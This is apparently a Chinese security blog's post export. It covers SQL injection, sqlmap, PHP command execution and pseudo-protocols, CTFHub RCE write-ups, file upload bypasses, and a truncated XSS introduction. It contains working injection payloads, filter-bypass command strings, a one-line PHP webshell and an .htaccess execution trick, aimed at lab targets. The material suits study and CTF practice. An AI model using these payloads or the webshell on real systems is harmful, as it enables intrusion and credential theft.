[{"title":"sql注入","url":"/post/530fceb2.html","content":"\n\n什么是SQL注入\nSQL 注入就是指 web应用程序对用户输入的数据合法性没有过滤或者是判断，前端传入的参数是攻击者可以控制，并且参数带入数据库的查询，攻击者可以通过构造恶意的 sql语句来实现 对数据库的任意操作。\n\nSQL注入攻击思路\n\n判断是否存在注入\n判断注入类型\n猜解语句中的字段数\n判断回显位置\n爆数据库名\n爆表名\n爆字段名\n查找内容\n\n\n判断是否存在SQL注入\n最为经典的单引号判断法：在参数后面加上单引号,比如: http://xxx/abc.php?id=1&#39; 如果页面返回错误，则存在SQL注入。原因是无论字符型还是整型都会因为单引号个数不匹配而报错。\n\n判断SQL注入类型类型分为两种：数字型和字符型\n\n数字型判断：可以使用经典的 and 1=1 和 and 1=2 来判断：\n\n\nurl中输入？id=1 and 1=1 页面依旧正常运行，继续下一步url中输入？id=1 and 1=2 页面运行错误，则说明此 Sql 注入为数字型注入。\n\n\n字符型判断：可以使用 and ‘1’=’1 和 and ‘1’=’2来判断：\n\n\nurl中输入1’ and ‘1’ = ‘1,页面运行正常，继续进行下一步。url中继续输入1’ and ‘1’ = ‘2,页面运行错误，则说明此 Sql 注入为字符型注入。\n\n常见的注入方式\n联合注入\n布尔盲注\n时间盲注\n宽字节注入\n报错注入\n堆叠注入\n二次注入\n……\n\n联合注入注入一般流程：\n\n\n判断注入点\n判断字段数\n判断回显位置\n爆破库名\n爆破表名\n爆破字段名\n爆破字段值\n\n\n以sql-libs/Less-1为例(1)判断注入点\tpayload：http://localhost/www.sql.com/Less-1/?id=1&#x27; and 1=1 --+\tpayload： http://localhost/www.sql.com/Less-1/?id=1&#x27; and 1=2 --+\t\t根据页面回显不同，判断id参数存在sql注入(2)判断字段数 order by\tpayload：http://localhost/www.sql.com/Less-1/?id=1&#x27; order by x --+\t发现x=3时有回显，x=4时无回显，判断出存在三列(3)判断回显位置 union select\t需将参数的数据值设为不存在\tpayload：http://localhost/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,3 --+ \t判断出回显位置为2，3(4)爆破库名 在回显位置替换参数即可\tpayload：http://localhost/sqli-labs/Less-1/?id=-1&#x27; union select 1,database(),3 --+ (5)爆破表名 \tpayload：http://localhost/sqli-labs/Less-1/?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 --+ (6)爆破字段名\tpayload：http://localhost/sqli-labs/Less-1/?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 --+ (7)爆破字段值\tpayload：http://localhost/sqli-labs/Less-1/?id=-1&#x27; union select 1,(select group_concat(username,0x3a,password) from users),3 --+\n\n报错注入应用场景：查询不回显内容，会打印错误信息\n\n常用函数：floor(),updatexml(),extractvalue()\n\n以updatexml()为例(1)爆表 修改 limit 0,1 参数 依次爆出所有表名\tpayload：http://localhost/sqli-labs/Less-1/?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+(2)爆字段名\tpayload：http://localhost/sqli-labs/Less-1/?id=1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),1) --+\t通过修改limit参数，获取所有字段名(3)爆字段值\tpayload：http://localhost/sqli-labs/Less-1/?id=1&#x27; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) --+\t通过修改limit参数，获取所有字段值(4)爆对应的密码\tpayload：http://localhost/sqli-labs/Less-1/?id=1&#x27; and updatexml(1,concat(0x7e,(select password from users where username = &#x27;Dumb&#x27; limit 0,1),0x7e),1) --+\t通过修改limit参数，获取所有字段值\n\n布尔盲注应用场景：\n\n代码存在sql注入漏洞，然而页面不会显数据，也不会显错误信息。只返回”right” 与wrong 这里我们可以通过构造语句，来判断数据库信息的正确性，在通过页面的“真”和“假”来识别我们的判断是否正确，这就是布尔盲注。\n\n常用函数：\n\nleft()       left(database(),1)&gt;’s’    database()显示数据库名称，left(a,b)从左侧截取a的前b位。regexp           select user() regexp ‘^r’  正则表达式用法 user()结果为root,regexp为匹配root的正则表达式like         select users() like ‘’ro%’   与regexp类似，使用like进行匹配substr函数   ascii() 函数    ascii(substr(select database()),1,1)=98 从1位置开始截取数据库名字的1个长度，ascii()将字符转化为ascii值。ord()   mid()     mid(a,b,c)ord(mid((select user()),1,1))=114从位置b开始，截取a字符串的c位，ord()函数通ascii()，将字符转为ascii值。\n\n时间盲注时间盲注是什么？\n\n通过注入特定语句，根据对页面请求的物理反馈，来判断是否注入成功，如：在SQL语句中使用sleep()函数\n看加载页面的时间来判断注入点\n适用场景：没有回显，甚至连注入语句是否执行都无从得知\n\n常用函数：\n\nsleep() – 返回0 命令中断返回1substr(a,b,c) – 从b为止开始截取字符串a的c长度mid() – 与substr完全一致count() – 计算总数ascii() – 返回第一个字符的ASII码ord() – 与ascii完全一致length() – 返回字符串的长度left() – 从左往右截取字符串right() –从右往左截取字符串if(condition,true,false)：condition为条件，条件为真返回true，条件为假返回false\n\n注入一般流程：\n\n先用length()获取数据库长度用substr() and sleep() 来确定每一个字符，从而确定数据库\n\n堆叠注入\n原理介绍： 在SQL中，分号（;）是用来表示一条sql语句的结束。\n\n\n联合注入也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union或者unionall执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。 \n\n\n局限性： 使用该注入，需要知道数据库的一些信息，例如表名，列名等。并不是每种环境都可以使用。oracle数据库不行，mysql、mssql‘postgresql可以。  \n\n\n应用实例：已经爆破出管理员密码，但是是加密存储，且无法解密。可以使用堆叠注入，在该表中注入 \n\n举个栗子;select if(length(database())&gt;1,sleep(3),1);select if(substr(database(),1,1)=&#x27;r&#x27;,sleep(3),1)\n\n二次注入\n原理 分为两步：第一步：插入恶意数据第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行转义，在写入数据库时还是保留用户输入的数据，但是该数据中包含恶意内容。 \n第二步：引用恶意数据在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。 \n\n\n例如：输入参数1’     参数经过转义函数变为1&#39;    参数进入数据库存储还原为1’寻找另一处引用这个数据的操作将1’从数据库中取出       取出后直接给变量并且带入SQL   SQL注入触发 实战   sql-lib 24 1.在创建用户界面 创建 admin’#  123 账号 2.登录  admin ‘#  123 账号 修改admin’#密码为  123456 3.发现 admin 密码变为123456\n\n\n实战   sql-lib 241.在创建用户界面 创建 admin’#  123 账号2.登录  admin ‘#  123 账号 修改admin’#密码为  1234563.发现 admin 密码变为123456\n\nSQL注入绕过注入符号绕过\n常见的注释符号有\n\n-- 注释内容# 注释内容/*注释内容*/;\n\n大小写绕过举个例子select * from users where id = -1 union SelEcT 1,2,3\n\n内联注释绕过\n内联注释就是把一些特有的仅在MYSQL上的语句放在 /*!...*/ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。\n\n举个例子select * from users where id = -1 union /*!select*/ 1,2,3;\n\n双写关键字绕过\n将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。例如select变成seleselectct，在经过waf的处理之后又变成select，达到绕过的要求。\n\n十六进制绕过举个例子test1等价于0x7465737431select * from users where username = 0x7465737431;\n\n空格过滤绕过/**/()回车(url编码中的%0a)`(tap键上面的按钮)tap两个空格\n\n过滤or and xor not 绕过and = &amp;&amp;or = ||xor = | # 异或not = !\n\n过滤等号=绕过\n不加通配符的like执行的效果和=一致，所以可以用来绕过。利用大小于号、!配合使用进行绕过\n\n","categories":["网络安全"],"tags":["web安全"]},{"title":"sqlmap","url":"/post/e5da2ca1.html","content":"\n\nsqlmap简介sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL进行SQL注入。\n用于数据库注入\n猜解是否能注入\n\n\npython sqlmap.py -u “url”\n\n\n猜解库\n\n\npython sqlmap.py -u “url” –dbs\n\n\n猜解表\n\n\npython sqlmap.py -u “url” –tables\n\n\n根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)\n\n\npython sqlmap.py -u “url” –columns -T admin\n\n\n根据字段猜解内容(假如通过3得到字段为username和password)\n\n\npython sqlmap.py -u “url” –dump -T admin -C “username,password”\n\n用于cookie注入\ncookie注入，猜解表\n\n\npython sqlmap.py -u “url” –cookie “cookie” –table –level 2\n\n\n猜解字段，(通过1的表猜解字段，假如表为admin)\n\n\npython sqlmap.py -u “url” –cookie “cookie” –columns -T admin –level 2\n\n\n猜解内容\n\n\npython sqlmap.py -u “url” –cookie “cookie” –dump -T admin -C “username,password” –level 2\n\npost登录框注入\n浏览器打开目标地址\nburp抓包，拦截请求\n点击提交，burp会拦截post请求\n复制post请求头为post.txt，并放到sqlmap目录下\n运行sqlmap\n\nstep1：sqlmap -r [&quot;请求头文本&quot;]  //测试是否存在注入step2：sqlmap -r [&quot;请求头文本&quot;] --current-db //查询当前数据库step3：sqlmap -r [&quot;请求头文本&quot;] -D [&quot;数据库名&quot;] --tables //查询当前数据库的所有表step4：sqlmap -r [&quot;请求头文本&quot;] -D [&quot;数据库名&quot;] -T [&quot;表名&quot;] --columns //查询指定库指定表的所有字段step5：sqlmap -r [&quot;请求头文本&quot;] -D [&quot;数据库名&quot;] -T [&quot;表名&quot;] -C [&quot;字段名&quot;] --dump //打印出指定库指定表指定字段的所有字段内容\n\n常见参数使用\n设置目标URL：\n\n\n参数：-u    每次只能扫描一个url格式：sqlmap -u “url”\n参数：-m    从文本中获取多个目标扫描，但是每次只能有一个url格式：sqlmap -m 1.txt、\n参数：-r    从文件中加载HTTP请求，这样的话，就不需要再去设定coolie，POST数据等值…..格式：sqlmap -r 1.txt\n\n\n设置回显等级：\n\n\n参数：-v0、只显示python错误以及严重的信息。1、同时显示基本信息和警告信息。（默认等级）2、同时显示debug信息。3、同时显示注入的payload。4、同时显示HTTP请求。5、同时显示HTTP响应头。6、同时显示HTTP响应页。\n\n\n设定探测等级：\n\n\n参数：–level默认为1level&gt;=2的时候就会测试HTTP Cookielevel&gt;=3的时候就会测试HTTP User-Agent/Referer头level=5的时候会测试HTTP Host\n\n参数介绍\noptions类：\n\n\nsqlmap –version    查看sqlmap版本信息.\n-h    查看功能参数(常用的)\n-hh　查看所有的参数 (如果有中文包 就最好了)\n-v　显示更详细的信息 一共7级, 从0-6.默认为1, 数值越大,信息显示越详细.\n\n\nTarget(指定目标):\n\n\n-d　直接连接数据库侦听端口,类似于把自己当一个客户端来连接.\n-u    指定url扫描,但url必须存在查询参数. 例: xxx.php?id=1 \n-l    指定logfile文件进行扫描,可以结合burp 把访问的记录保存成一个log文件, sqlmap可以直接加载burp保存到log文件进行扫描\n-x    以xml的形式提交一个站点地图给sqlmap(表示不理解..)\n-m    如果有多个url地址,可以把多个url保存成一个文本文件 -m可以加载文本文件逐个扫描\n-r    把http的请求头,body保存成一个文件 统一提交给sqlmap,sqlmap会读取内容进行拼接请求体\n-g    利用谷歌搜索引擎搭配正则来过滤你想要的\n-c    加载配置文件,配置文件可以指定扫描目标,扫描方式,扫描内容等等.加载了配置文件sqlmap就会根据文件内容进行特定的扫描\n\n\nRequest类参数\n\n\n–data    提交的时候要携带的参数（get，post通用，最简单的post请求方式）\n–users     获取数据库用户\n–dbs    获取所有数据库\n–cookie    设置cookie头\n–user-agent    指定user-agent（防止对方服务器侦测到）\n–random-agent    随机agent\n–host    指定host头\n–level    安全级别 (1-5, &gt;=3,检测anent,&gt;=5,检测host头)\n–referer    指定referer头(level &gt;=3才检测)\n–headers    指定额外的headers请求头(多个必须使用换\\n,首字母必须大写)\n–method　指定请求方式, 默认为get,get请求不成功尝试post　　　\n–proxy　指定代理 \n–proxy-cred    指定代理的账号密码(代理需要账号密码的前提下)\n–delay　每次请求的延迟时间,单位秒,默认无延迟.\n–timeout　请求超时时间,默认30秒.\n–retries　连接超时重试次数 ,默认3次\n\n","categories":["网络安全"],"tags":["工具"]},{"title":"RCE(远程代码执行漏洞)","url":"/post/de7b7d00.html","content":"\n\n形成原因\n应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数的参数，并且开发人员对这个参数没有严格的过滤时就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。\n\n可能存在命令执行漏洞的函数（PHP）\n利用系统函数实现命令执行的函数\n\n\neval()assert()preg_replace()call_user_func()\n\n\n直接执行系统命令的代码函数\n\n\nsystem()exec()shell_exec()&amp;(``)passthru()pcntl_exec()popen()proc_open()\n\n命令拼接符号\nWindows的系统命令拼接符\n\n\n\n\n拼接符\n示例\n拼接符的详解\n\n\n\n&amp;\nA&amp;B\n无论A是false还是true，B都执行，即互不影响\n\n\n&amp;&amp;\nA&amp;&amp;B\n具有短路效果，A是false，B就不执行，有短路效果\n\n\n|\nA|B\n表示A命令语句的输出，作为B命令语句的输入执行。当A为false的时候将不会执行\n\n\n||\nA||B\n表示A命令语句执行失败，然后才执行B命令语句\n\n\n\nLinux的系统命令拼接符\n\n\n&amp;    使命令在后台运行;    进行多条命令的无关联执行，每一条执行结果互不影响&amp;&amp;    与Windows一样，左边成功才执行右边||    与Windows一样，前面执行失败才执行后面()    执行多个命令时，需要用命令分隔符分号隔开每个命令，并使用**()**把所有命令组合起来\n\nphp伪协议php支持的伪协议\n\nfile://    访问本地文件http://    访问HTTP(s)网址ftp://    访问FTP(s) URLsphp://    访问各个输入/输出流（I/O streams）zlib://    压缩流data://    数据（RFC 2397）glob://    查找匹配的文件路径模式phar://    PHP 归档ssh2://    Secure Shell 2rar://    RARogg://    音频流expect://    处理交互式的流\n\nphp://filter\n获取指定文件源码。当他与包含函数结合时，php://filter流会被当作php文件执行。\n\n协议参数\n\n\n\n名称\n描述\n\n\n\nresource=&lt;要过滤的数据流&gt;\n这个参数是必须的。它指定了你要筛选过滤的数据流。\n\n\nread=&lt;读链的筛选列表&gt;\n该参数可选。可以设定一个或多个过滤器名称，以管道符（`\n\n\nwrite=&lt;写链的筛选列表&gt;\n该参数可选。可以设定一个或多个过滤器名称，以管道符（`\n\n\n&lt;；两个链的筛选列表&gt;\n任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。\n\n\n常用：\nphp://filter/read=convert.base64-encode/resource=index.phpphp://filter/resource=index.phpconvert.base64-encode\t过滤器\n\ndata://\n数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。\n\n&lt;?php// 打印 &quot;I love PHP&quot;echo  file_get_contents ( &#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27; );?&gt;\n\nfile://\n用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响file://协议主要用于访问文件(绝对路径、相对路径以及网络路径)比如：?file=file:///etc/passsword\n\nphp://\n在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用php://作用为访问输入输出流\n\nphp://input\nphp://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。\n\n例如：?cmd=php://inputPOST数据：&lt;?php phpinfo()?&gt;注意：当enctype=&quot;multipart/form-data&quot;的时候php://input是无效的遇到file_get_contents()要想到用php://input绕过\nzip://\nzip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。\n例如：zip://[压缩包绝对路径]#[压缩包内文件]\n\nzip://中只能传入绝对路径。要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23只需要是zip的压缩包即可，后缀名可以任意更改。相同的类型的还有zlib://和bzip2://\n\n例如：?file=zip://D:\\zip.jpg%23phpinfo.txt\nPHP伪协议总结 \n各种绕过\ncat被过滤时\n\nmore     #一页一页的显示档案内容less     #与 more 类似head     #查看头几行tac      #从最后一行开始显示，可以看出 tac 是 cat 的反向显示tail     #查看尾几行nl       #显示的时候，顺便输出行号od       #以二进制的方式读取档案内容sort     #可以查看uniq     #可以查看//vi       #一种编辑器，这个也可以查看//vim      #一种编辑器，这个也可以查看//file -f  #报错出具体内容//sh /flag 2&gt;%261  #报错出文件内容#使用转义符号ca\\t /fl\\agcat fl&#x27;&#x27;ag#拼接法a=fl;b=ag;cat$IFS$a$b#使用空变量$*和$@，$x,$&#123;x&#125;绕过ca$*t flag || ca$@t flag || ca$5t flag ca$&#123;5&#125;t flagfind    #列出当前目录下的文件以及子目录所有文件\n\n\n过滤空格\n\ncat&lt;flag  #重定向符cat$&#123;IFS&#125;flag || cat$IFS$9flag #全局变量#$IFS在linux下表示分隔符，但是如果单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果#然而如果加一个&#123;&#125;就固定了变量名，同理在后面加个$可以起到截断的作用，#为什么要用$9呢，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串\n\n\n过滤目录分隔符\n\n#采用多管道命令绕过127.0.0.1||cd flag_is_here;cat flag_262431433226364.php%0a      #换行符%0d      #回车符号用?&gt;代替 ;#在php中可以用?&gt;来代替最后的一个; ，因为php遇到定界符关闭标签会自动在末尾加上一个分号\n\n其他绕过：命令执行(RCE)面对各种过滤，骚姿势绕过总结 \n","categories":["网络安全"],"tags":["web安全"]},{"title":"CTFHUB_RCE","url":"/post/7e6bea45.html","content":"\n\neval执行打开环境发现一段php代码：\n&lt;?phpif (isset($_REQUEST[&#x27;cmd&#x27;])) &#123;    eval($_REQUEST[&quot;cmd&quot;]);&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;\n\n发现参数为cmd\npayload：?cmd=phpinfo();有回显，说明可以利用系统命令函数\npayload：?cmd=system(&quot;ls /&quot;);有回显，并且看到有关于flag的文件，读取它\npayload：?cmd=system(&quot;ls / | cat /flag_9712&quot;);得到flag\n文件包含打开环境发现一段php代码：\n&lt;?phperror_reporting(0);if (isset($_GET[&#x27;file&#x27;])) &#123;    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) &#123;        include $_GET[&quot;file&quot;];    &#125; else &#123;        echo &quot;Hacker!!!&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;&lt;hr&gt;i have a &lt;a href=&quot;shell.txt&quot;&gt;shell&lt;/a&gt;, how to use it ?\n\n介绍一下陌生函数：\n\nstrpos(x,y)    查看y是否在x里\ninclude    将文件里的代码当作原来文件的代码执行\n\n点击shell得到一串php代码：\n&lt;?php eval($_REQUEST[&#x27;ctfhub&#x27;]);?&gt;\n\n\n\n根据代码得出：需要用GET传参方式传参，参数为file\npayload：?file=shell.txt点击shell得到php代码：&lt;?php eval($_REQUEST[&#39;ctfhub&#39;]);?&gt;\npayload：以post方式传参：ctfhub=system(&quot;ls&quot;)根据回显发现没有有关flag的文件，那就读取上级目录看看\npayload：ctfhub=system(&quot;ls /&quot;)根据回显发现flag\npayload：ctfhub=system(&quot;cat /flag&quot;)得到flag\nphp://input打开环境发现php代码：\n&lt;?phpif (isset($_GET[&#x27;file&#x27;])) &#123;    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) &#123;        include($_GET[&quot;file&quot;]);    &#125; else &#123;        echo &quot;Hacker!!!&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;&lt;hr&gt;i don&#x27;t have shell, how to get flag? &lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;\n\n根据代码得出：需要以GET方式传入一个名为file参数的数据，点击phpinfo()发现，php://input可以使用\npayload：?file=php://input根据php://input规则，需要POST传入数据\npayload：&lt;?php system(&quot;ls&quot;);?&gt;根据回显发现没有flag，查找上级目录\npayload：&lt;?php system(&quot;ls /&quot;);?&gt;发现flag，查看\npayload：&lt;?php system(&quot;cat /flag_4801&quot;);?&gt;得到flag\n读取源代码打开环境得到php代码：\n&lt;?phperror_reporting(E_ALL);if (isset($_GET[&#x27;file&#x27;])) &#123;    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) &#123;        include($_GET[&quot;file&quot;]);    &#125; else &#123;        echo &quot;Hacker!!!&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;&lt;hr&gt;i don&#x27;t have shell, how to get flag? &lt;br&gt;flag in &lt;code&gt;/flag&lt;/code&gt;\n\n根据提示使用php://input发现不管用，用一下新的伪协议吧——php://filter\npayload：?file=php://filter/resource=/flagflag一下子就出来了呢\n远程包含打开环境得到代码：\n&lt;?phperror_reporting(0);if (isset($_GET[&#x27;file&#x27;])) &#123;    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) &#123;        include $_GET[&quot;file&quot;];    &#125; else &#123;        echo &quot;Hacker!!!&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;&lt;hr&gt;i don&#x27;t have shell, how to get flag?&lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;\n\n用一下php://input吧，一下子就得到了flag呢\npayload：&lt;?php system(&quot;cat /flag&quot;);?&gt;\n命令注入根据回显得出这是一个ping IP的题目\nping一下baidu.com得到回显\npayload：baidu.com | ls得到回显并发现可疑.php文件，打开发现打不开该文件，试一下base64吧\npayload：baidu.com | cat 31327443624755.php | base64 再解码得到flag\n过滤cat直接上payload\npayload：baidu.com | ls得到flag文件，但是cat被过滤了，换个吧\npayload：baidu.com | more flag_34911944417894.php | base64  得到加密后的flag，解码得到flag\n过滤空格直接上payload\npayload：baidu.com | ls发现没有东西，空格被过滤\npayload：baidu.com$&#123;IFS&#125;|$&#123;IFS&#125;ls得到flag文件，查看该文件\npayload：baidu.com$&#123;IFS&#125;|$&#123;IFS&#125;cat$&#123;IFS&#125;flag_31123320624556.php$&#123;IFS&#125;|$&#123;IFS&#125;base64解密得到flag\n过滤目录分隔符payload：baidu.com | ls得到flag目录\npayload：baidu.com;cd flag_is_here;ls得到flag文件，查看文件\npayload：baidu.com;cd flag_is_here;cat flag_4088165719730.php|base64解码得到flag\n过滤运算符过滤了运算符，但是**;**漏掉了\npayload：baidu.com;ls查看flag文件\nbase64 .php &lt;=&gt;,php|base64\npayload：baidu.com;base64 flag_80902931728195.php\n综合过滤练习看完代码傻眼了，啥都被过滤了，哎~~~\n看看过滤笔记再来试试看;可以用%0a代替但是需要在url上使用\npayload：baidu.com%0als得到flag目录，继续搞\npayload：baidu.com%0acd$&#123;IFS&#125;fl&#39;&#39;ag_is_here%0als得到flag文件\npayload：baidu.com%0acd$&#123;IFS&#125;fl&#39;&#39;ag_is_here%0abase64$&#123;IFS&#125;fl&#39;&#39;ag_248952873310635.php解码得到flag\n","categories":["网络安全"],"tags":["CTFHUB-wp"]},{"title":"文件上传","url":"/post/592e5fba.html","content":"\n\nWebShell与WebShell管理工具什么叫做WebShell\nWebShell，简称网页后门。运行在Web应用之上的远程控制程序 \nwebshell其实就是一张网页，由PHP、JSP、ASP、ASP.NET等web语言开发，但并不具备常见网页的功能，例如登陆、注册、信息展示等功能，一般会具备文件管理、端口扫描、提权、获取系统信息等功能\n\n常见的WebShell有哪些\n大马、小马、各种马等\n拥有完整功能的webshell，我们一般称为大马\n功能简易的webshell称为小马\n除此之外还有一句话木马、不死马、脱库马等等，是对webshell功能或者特性的简称\n\nWebShell有什么作用呢大马有什么作用呢\n\n上传大马后，可以通过大马来获取目标主机的控制权限、对内网进行扫描、获取内部系统的信息、盗取数据库等一系列操作\n\n一句话木马解读\n&lt;?php @eval($_POST[x]); ?&gt;\n\n\n$_POST[x]: 获取POST请求参数中x的值。例如POST请求中传递x=phpinfo();，那么$_POST[x]就等同于phpinfo();\neval()将字符串当作PHP代码去执行。例如eval(&#39;phpinfo();&#39;)，其中phpinfo();会被当做PHP代码去执行。\n\n&lt;?php @eval($_POST[x]); ?&gt;   实际上的传递过程是这样的\t\t\t↓\t\t\t↓\t\t\t\t\t\t↓&lt;?php @eval(&#x27;phpinfo();&#x27;); ?&gt; 实际的语句是这样的 \t\t\t\n\n\n我们通过该webshell，传递任意PHP代码，让其去执行，从而达到任意代码执行。\n错误控制运算符，当将 @放置在一个PHP表达式之前，该表达式可能产生的任何错误信息都被 忽略掉。\n\n文件上传什么是文件上传漏洞\n\n文件上传漏洞是指文件上传功能没有对上传的文件做合理严谨的过滤，导致用户可以利用此功能，上传能被服务端解析执行的文件，并通过此文件获得执行服务端命令的能力。\n\n客户端JavaScript检测\n如果上传非法文件，返回结果很快，或者F12打开开发者模式，上传非法文件，发现没有网络请求，但是被拦截了，很有可能就是客户端进行了JS校验检测。\n\n&lt;script type=&quot;text/javascript&quot;&gt;    function checkFile() &#123;        var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;        if (file == null || file == &quot;&quot;) &#123;            alert(&quot;请选择要上传的文件!&quot;);            return false;        &#125;        //定义允许上传的文件类型        var allow_ext = &quot;.jpg|.png|.gif&quot;;        //提取上传文件的类型        var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));        //判断上传文件类型是否允许上传        if (allow_ext.indexOf(ext_name) == -1) &#123;            var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;            alert(errMsg);            return false;        &#125;    &#125;&lt;/script&gt;\n\n绕过思路：1.直接本地禁用JS，不让其做检测 2.抓包，修改文件后缀名类型，绕过检测限制\n服务器后端检测文件类型检测\n此类检测防护主要是从content-type进行检测，检验请求中content-type是否符合可接受的上传类型(如”image/gif”,”image/png”,”image/jpeg”) \n\nif (isset($_POST[&#x27;submit&#x27;])) &#123;if (file_exists(UPLOAD_PATH)) &#123;        if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];                      if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;     \n\n绕过思路：抓包将content-type改为可接受图片形式，即可绕过\n文件头类型检测\n上个文件类型是检测content-type,比较好伪造，这个则是使用getimagesize()函数来获取文件的MIME类型，通过文件头进行判断文件类型\n\nif(file_exists($filename))&#123;       $info = getimagesize($filename);\n\n\n文件头就是文件特定的标志，如二进制PE文件的4D5A，bmp文件的424D，zip文件的504B0304，各种常见文件的文件头类型大家可以查找了解一下，常见图片文件头如下：\n\n\ngif: GIF89a\njpg,jpeg: FF D8 FF E0 00 10 4A 46 49 46\npng: 89 50 4E 47 0D 0A\n\n绕过思路：针对这种，上传木马恶意文件时，先使用编辑工具在数据最前面添加图片的文件头进行伪造，即可绕过\n文件扩展名检测\n这种类型有基于黑名单检测和白名单检测。通常基于黑名单是很不安全的，黑名单机制：只拦截名单中出现的扩展后缀名，其余默认放行。这就取决于名单中的扩展后缀名覆盖能力范围了，很难把所有的考虑全面，就很容易造成漏洞。\n\n黑名单绕过思路：可以从服务器的解析特性进行分析，如特殊可解析后缀php3,php7,phtml,jspx等 如特殊的解析方式陌生后缀名，带换行后缀名，双后缀名等解析差异造成的漏洞。 还可以从混淆方面出发，后缀名大小写，点绕过，空格绕过，以及上传.htaccess配置控制文件权限和::$DATA数据流的使用\n\n基于白名单相对于黑名单就安全很多了，要求只能是特定扩展名的文件才能够上传。\n\n白名单绕过思路：MIME绕过，修改文件类型为白名单可接受的类型，以及%00，0x00截断绕过，这种场景针对save_path可控。\n\n00截断原理其实很巧妙，利用场景是文件保存路径可控，这样一来我们上传的文件符合白名单就行，真正动手的地方在文件保存路径出，可以放上自己的webshell文件，然后在webshell文件后面添加%00,或0x00，再加一些字符，这样一来，系统在解析碰到00就会截断，后面字符就不起作用，只剩下前面的webshell文件名，就可以在url中进行访问了。%00和0x00的使用区别在于提交get请求时，是%00,会进行url自动解码动作，然后进入验证函数。0x00则是post请求直接进入验证函数。\n\n.htaccess\nhtaccess文件是apache服务器的一个配置文件，它负责相关目录下的网页配置\n\n\n通过htaccess文件，可以帮助我们实现：网页301重定向、自定义404错误页面，改变文件扩展名、允许/阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能\n\n&lt;FilesMatch &quot;\\.jpg&quot;&gt;  SetHandler application/x-httpd-php &lt;/FilesMatch&gt;\n\n\n其中，SetHandler application/x-httpd-php意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行，不符合规则则报错\n\n","categories":["网络安全"],"tags":["web安全"]},{"title":"XSS","url":"/post/fe1aa8c3.html","content":"\n\nXSS攻击概述\n跨站脚本攻击XSS(Cross Site Scripting)恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页面时，嵌入 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。XSS 攻击针对的是用户层面的攻击！\n\nXSS攻击原理\nHTML 是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（&lt;）被看作是 HTML 标签的开始，之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了 HTML 标签，当这些 HTML 标签引入了一段 JavaScript 脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生 XSS 漏洞。\n\n所有标签的 &gt; 都可以用 // 代替， 例如 